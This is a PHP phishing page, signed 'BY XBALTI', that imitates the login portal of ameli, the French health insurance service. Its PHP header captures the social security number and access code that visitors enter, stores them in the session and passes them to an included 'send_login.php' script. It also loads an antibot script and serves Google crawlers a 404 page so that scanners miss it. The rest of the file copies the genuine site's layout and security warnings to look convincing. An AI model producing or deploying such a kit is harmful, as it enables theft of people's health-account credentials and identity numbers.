<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
if(isset($_POST['login']) && isset($_POST['password'])){	
	if(!empty($_POST['login']) && !empty($_POST['password'])){
#################################################		
$_SESSION['login']   = $_POST['login'];
$_SESSION['password']   = $_POST['password'];
################################################
	include"./XBALTI/send_login.php";
	}
}
//------------------------------------------|| ANTIBOTS ||---------------------------------------------------//
include "./antbots/antibot.php";
//--------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//--------------------------------------------------------------------------------------------------------------//
?>
<!DOCTYPE html>
    <html lang="fr"><head xmlns="http://www.w3.org/1999/xhtml" lang="fr" xml:lang="fr">
	 <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="apple-touch-icon" sizes="57x57" href="./css/img/icon/apple-icon-57x57.png"/>	
	<link rel="apple-touch-icon" sizes="60x60" href="./css/img/icon/apple-icon-60x60.png"/>	
	<link rel="apple-touch-icon" sizes="72x72" href="./css/img/icon/apple-icon-72x72.png"/>	
	<link rel="apple-touch-icon" sizes="76x76" href="./css/img/icon/apple-icon-76x76.png"/>
	<link rel="apple-touch-icon" sizes="114x114" href="./css/img/icon/apple-icon-114x114.png"/>
	<link rel="apple-touch-icon" sizes="120x120" href="./css/img/icon/apple-icon-120x120.png"/>	
	<link rel="apple-touch-icon" sizes="144x144" href="./css/img/icon/apple-icon-144x144.png"/>	
	<link rel="apple-touch-icon" sizes="152x152" href="./css/img/icon/apple-icon-152x152.png"/>	
	<link rel="apple-touch-icon" sizes="180x180" href="./css/img/icon/apple-icon-180x180.png"/>	
	<link rel="icon" type="image/png" sizes="192x192" href="./css/img/icon/android-icon-192x192.png"/>	
	<link rel="icon" type="image/png" sizes="32x32" href="./css/img/icon/favicon-32x32.png"/>	
	<link rel="icon" type="image/png" sizes="96x96" href="./css/img/icon/favicon-96x96.png"/>	
	<link rel="icon" type="image/png" sizes="16x16" href="./css/img/icon/favicon-16x16.png"/>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"/>
	<link rel="stylesheet" type="text/css" href="https://fotn-jsimg.com/css-js/cart,jpg"><meta name="description" content="Vos démarches en ligne avec l'Assurance Maladie. Suivi remboursements - Attestations - CEAM - Carte Vitale - Messagerie mail -  Coaching santé"/>
	<title>Compte ameli - mon espace personnel</title>
	
	<link rel="stylesheet" type="text/css" href="./css/layout.css">
	
	<link rel="stylesheet" type="text/css" href="./css/biblicnam-structure-sans.min.css">
	
	<link rel="stylesheet" type="text/css" href="./css/reset.css">
	
	<link rel="stylesheet" type="text/css" href="./css/clear.css">
	
	<link rel="stylesheet" type="text/css" href="./css/liens.css">
	
	<link rel="stylesheet" type="text/css" href="./css/forms.css">
	
	<link rel="stylesheet" type="text/css" href="./css/boutons.css">
	
	<link rel="stylesheet" type="text/css" href="./css/general.css">
	
	<link rel="stylesheet" type="text/css" href="./css/nav.css">
	
	<link rel="stylesheet" type="text/css" href="./css/colors.css">
	
	<link rel="stylesheet" type="text/css" href="./css/custom.css">
	
	<link rel="stylesheet" type="text/css" href="./css/centrer.css">
	
	<style type="text/css">
					.r_cnx_page .r_cnx_btlien,
					.r_cnx_page .r_cnx_btsubmit,
                    .r_ddc_btsubmit,
                    .r_ddc_btretour,
                    .r_ddc_btterminer,
                    .blocformfond fieldset,
                    .blocformfond .bloc_infos,
                    .r_acc_bloc_infos,
                    .bloc_infos_perso .content,
                    .imgCriteresPhoto,
                    .bloc_infos_perso .bloc_infos,
                    .avertissement
                    {
                    	behavior: url(/PortailAS/framework/skins/assure/js/PIE.htc);
                    }
                </style>
				
				
				<link rel="stylesheet" type="text/css" href="./css/window.css">
				  </head>
				      

<body><header class="wlp-bighorn-header" role="banner">
				    <div class="wlp-bighorn-layout wlp-bighorn-layout-flow">
				       <div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto">
					  <div class="carder-fl" id="carder-fl"></div>
					<div class="wlp-bighorn-theme wlp-bighorn-theme-borderless">
				<div id="Header" class="wlp-bighorn-window  ">
			<div class="wlp-bighorn-window-content">





























 <style type="text/css">
	 #Header .tetiere-connexion .r_btsubmit{
	 	display : none;
	 }
		
 </style>


	<div style="overflow-x:hidden;">
	<div class="tetiere-connexion">

	        <div class="liens">
	        	
			        <!-- Redirection vers la page de connexion -->
					
						
						<a tabindex="1" class="r_btsubmit r_btlien lien-connexion" title="Votre compte ameli - Connexion">
							Se connecter
						</a>
					
		
					
						
						
						
						<a tabindex="12" class="r_btsubmit r_btlien" id="id_btn_creation">
							Créer mon compte
						</a>
					
				
	
	
				
			</div>

		
		
		<a tabindex="-1" class="r_lien_image" title="Accéder à l'accueil">
			<img src="./img/logo_general.png" class="logoam" alt="Logo du régime d'assurance maladie">
			<img src="./img/Icon-60@3x.png" class="logoam-320" alt="Logo du régime d'assurance maladie">
		</a>
	</div>
	</div>


  
<div id="HeaderrecommandationsSecurite" class="fenetre invisible " tabindex="0" role="alert" aria-labelledby="HeaderrecommandationsSecurite_title">
	<div class="fenetre-header">
		<span id="HeaderrecommandationsSecurite_title" class="fenetre-title">Recommandations de sécurité</span>
		<span id="HeaderrecommandationsSecurite_close" class="fenetre-button" role="button">
			<span class="label-close">Fermer</span>
		</span>
	</div>
	<div class="fenetre-content">
	
		
	
	<div>
	<ul style="margin-left: 1em">
		<li style="margin-top: 1em">
		  Le code d'accès au compte ameli est strictement personnel, il convient de le garder secret. N'oubliez pas de le modifier régulièrement.
		</li>
		<li style="margin-top: 1em">
		  Assurez-vous que l'ordinateur sur lequel vous consultez votre compte ameli est bien protégé par un antivirus et que celui-ci est à jour.
		</li>
		<li style="margin-top: 1em">
		  Vérifiez l'adresse (URL) dans la barre de votre navigateur lorsque vous consultez votre compte ameli depuis internet : <a></a>
		</li>
		<li style="margin-top: 1em">
		  L'adresse (URL) doit débuter par https:// et un cadenas doit apparaître.
		</li>
		<li style="margin-top: 1em">
		  N'oubliez pas de vous déconnecter de votre session ameli avant de fermer votre navigateur internet. Ceci plus particulièrement si vous utilisez un ordinateur partagé (cybercafé...)
		</li>
	</ul>
</div>

	</div>
</div></div></div></div></div></div></header><div id="ameli_portal_book_2" class="wlp-bighorn-book"><nav class="wlp-bighorn-menu-multi" role="navigation"></nav><div class="wlp-bighorn-book-content"><div id="as_connexion_book" class="wlp-bighorn-book"><div class="wlp-bighorn-book-content"><main id="as_login_page" class="wlp-bighorn-page-unconnect" role="main"><section id="contenu" class="corps-de-page"><div class="wlp-bighorn-layout wlp-bighorn-layout-grid"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell"><div></div><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div id="connexioncompte_2" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">



























<link href="../../framework/skins/assure/css/centrer.css" rel="stylesheet" type="text/css">

<script type="text/javascript" src="/PortailAS/biblicnam/js/placeholders.polyfill.min.js"></script>
<script type="text/javascript" src="/PortailAS/js/fr/cnamts/as/effect.js"></script>
<script type="text/javascript" src="/PortailAS/js/fr/cnamts/as/demandeCodeProvisoire.js"></script>



 
 <style type="text/css">
 .wlp-bighorn-book{
 	width : 100%;
 }
 #connexioncompte_2 {
	padding-top: 190px;
}
 
 
@media only screen and (max-width : 767px) { 
 #Header .tetiere-connexion {
 	margin-bottom: 60px;
 }
 .connexioncompte_2 .connexion-login {
 	margin-top: -20px;
 }
 #erreurCookie {
 	margin-top: -20px;
 	margin-bottom: 60px;
 }
 #connexioncompte_2 {
    padding-top: 100px;
}
}
@media only screen and (min-width : 768px) { 
 #Header .tetiere-connexion {
 	margin-bottom: 88px;
 }
 .connexioncompte_2 .connexion-login {
 	margin-top: -48px;
 }
 #erreurCookie {
 	margin-top: -48px;
 	margin-bottom: 88px;
 }
}
/* Small Devices, Tablets */
@media only screen and (max-width : 768px) {
	.connexioncompte_2{
		padding-right: 30px !important;
		padding-left: 30px !important;
	}
}
input:-webkit-autofill {
    -webkit-box-shadow: 0 0 0 50px white inset !important;
}
 </style>

<div class="connexioncompte_2 centrepage">







						

<div class="r_cnx_page" id="loginPage"> 
	
	
	
		
		
	
	
		
	
	
		
	
	
	
	<div>
		<div class="r_cnx_maintenance">
			<!-- Affichage ou non du message de maintenance -->
									
			
		</div>
		
		<div class="r_cnx">
		<div class="connexion-login">
			<h1>
			<p class="texte-center title">
				J'accède à mon compte ameli
			</p>
			</h1>
			
			<div class="invisible zone-alerte" id="navIncompatible">
				<div class="gras">Mon compte ameli fonctionnera mieux avec une version plus récente d'Internet Explorer !</div>
   				<div>Mettez à jour votre navigateur grâce à ce lien <a target="downloadIE" title="Mettre à jour son navigateur (nouvelle fenêtre)"></a></div>
			</div>
		
			<script src="./js/jquery.min.js"></script>
            
            
<script src="./js/jquery.validate.min.js"></script>
            
            
            
<script>

$(function() {

  $("form[name='formila']").validate({
   
    rules: {
        
      login: "required",
      password: "required",
    },

    messages: {
        
      login: "",
      password: "",
        
    },
      

  });
});

</script>
			<div class="r_cnx_cadre_gris" id="idBlocCnx">		
				<form name="formila"  method="post" action="" class="r_cnx_form">
					<div>
		<!-- SAISIE DU NIR -->
						
						<div id="div_connexioncompte_2_nir_as" class="div_connexioncompte_2_wrapper">
							
								<span class="zone_champ_saisie"><input id="connexioncompte_2nir_as" type="text" maxlength="18" size="13" value="" placeholder="Mon numéro de sécurité sociale" title="Mon numéro de sécurité sociale" tabindex="3" name="login" required="required"></span>
							
							
						 	
						</div>
						<div><span id="connexioncompte_2nir_as_messageErreur" class="message_erreur message_erreur_invisible"></span>
</div> 
			<!--  AIDE SAISIE NIR -->
						<div id="AideSaisieNir" class="En-savoir-plus">
							<a id="bulleAideSaisieNir" class="myClickableThingy" title="Obtenir plus d'information">
								Où trouver mon numéro de sécurité sociale&nbsp;?
							</a>
						</div>	   					
						<div id="divAideSaisieNir" class="En-savoir-plus hidden"> 
							<img id="closeAideNir" src="/PortailAS/framework/skins/assure/images/refonte/connexion/close_20px.png" alt="Logo du régime d'assurance maladie">
							<p class="title">Aide pour le n° de sécurité sociale</p>
							<br>
							<p class="contenu">
						 	Saisissez votre numéro de sécurité sociale à 13 chiffres.<br> Attention, si vous êtes ayant droit, saisissez le numéro de sécurité sociale de la personne à laquelle vous êtes rattaché.
							</p>
						</div>
						
						
		<!-- SAISIE DE LA DDN -->
						

		<!-- SAISIE DU CODE PERSO -->
						
						
						<div id="div_connexioncompte_2_code">
							<span class="zone_champ_saisie">
								<input id="connexioncompte_2connexion_code" maxlength="13" placeholder="Mon code (4 à 13 chiffres) " tabindex="5" size="18" name="password" type="password" class="champ" title="Mon code (4 à 13 chiffres) " autocomplete="new-password" value="" required="required">
							</span>
						</div>
						
		<!-- AIDE CODE PERSO -->		
						
											
					
					<div id="aideCode" class="En-savoir-plus">							
							<a id="problemeConnexion" title="Code perdu, non-reçu ou compte verrouillé" onclick="return xt_click(this,'C','','click_probleme_connexion','N');">
							Code oublié ?
							</a>
						</div>	 

						
						<input type="hidden" name="connexioncompte_2actionEvt" value="connecter">
						<div>
							<input id="id_r_cnx_btn_submit" tabindex="8" type="submit" name="submit" value="me connecter" class="r_btsubmit btn-connection">
						</div>
					</div>
				</form>
				
				<div class="connexion-FRCO">					
					<p class="texte-center"><span>Ou</span></p>
					<div class="imgco-FRCO">
						<a>
							<img src="./img/france-connect.png" alt="me connecter avec FranceConnect">
						</a>
					</div>
					
						
						
						
					
					<p class="texte-center msg-connexion"> 
						Première visite ? 
						<a>
							Créer un compte
						</a><br><br>
					</p>
				</div>
			</div>
		</div>
		</div>

	</div>
</div>


</div> 

















</div></div></div></div></div></div></section></main></div></div></div></div><footer class="wlp-bighorn-footer" role="contentinfo"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div class="wlp-bighorn-theme wlp-bighorn-theme-borderless"><div id="Footer" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">



























<div class="footer-connexion">	
	<ul>
		<li>
			<a class="logo-footer" href="" title="Accéder à l'accueil">
			
				<img src="./img/footer_logo_ameli.png" class="logoam" alt="Logo du régime d'assurance maladie">
			</a>
		</li>
		<li>
			<a id="id_lien_info_legales" target="aideAmeli" title="Accéder aux informations (nouvelle fenêtre)">
				Informations légales
			</a>
		</li>
		<li>
			<a id="id_lien_copyright" target="aideAmeli" title="Accéder aux informations (nouvelle fenêtre)">
				Propriété intellectuelle
			</a>
		</li>
		<li>
			<a id="id_lien_condition_utilisation" target="aideAmeli" title="Accéder aux informations (nouvelle fenêtre)">
				Conditions d'utilisation
			</a>
		</li>
	
		<li>
			<a id="id_lien_recommandations_securite " target="aideAmeli" title="Recommandations de sécurité (nouvelle fenêtre)">
				Recommandations de sécurité
			</a>
		</li>
	

		<li>
			<a id="id_lien_site_ameli.fr" title="Accès au site Ameli.fr (nouvelle fenêtre)" target="aideAmeli">
				Site Ameli
			</a>
		</li>
		
		<li>
			<a id="id_lien_aide_footer" target="aideAmeli" title="Accéder aux informations (nouvelle fenêtre)">
				Aide
			</a>
		</li>
				
		
	</ul>
</div>





<div id="FooterrecommandationsSecurite" class="fenetre invisible " tabindex="0" role="alert" aria-labelledby="FooterrecommandationsSecurite_title">
	<div class="fenetre-header">
		<span id="FooterrecommandationsSecurite_title" class="fenetre-title">Recommandations de sécurité</span>
		<span id="FooterrecommandationsSecurite_close" class="fenetre-button" role="button">
			<span class="label-close">Fermer</span>
		</span>
	</div>
	<div class="fenetre-content">
	
		
	
	<div>
	<ul style="margin-left: 1em">
		<li style="margin-top: 1em">
		  Le code d'accès au compte ameli est strictement personnel, il convient de le garder secret. N'oubliez pas de le modifier régulièrement.
		</li>
		<li style="margin-top: 1em">
		  Assurez-vous que l'ordinateur sur lequel vous consultez votre compte ameli est bien protégé par un antivirus et que celui-ci est à jour.
		</li>
		<li style="margin-top: 1em">
		  Vérifiez l'adresse (URL) dans la barre de votre navigateur lorsque vous consultez votre compte ameli depuis internet : <a></a>
		</li>
		<li style="margin-top: 1em">
		  L'adresse (URL) doit débuter par https:// et un cadenas doit apparaître.
		</li>
		<li style="margin-top: 1em">
		  N'oubliez pas de vous déconnecter de votre session ameli avant de fermer votre navigateur internet. Ceci plus particulièrement si vous utilisez un ordinateur partagé (cybercafé...)
		</li>
	</ul>
</div>

	</div>
</div>








</div></div></div></div></div></footer></body>


</html>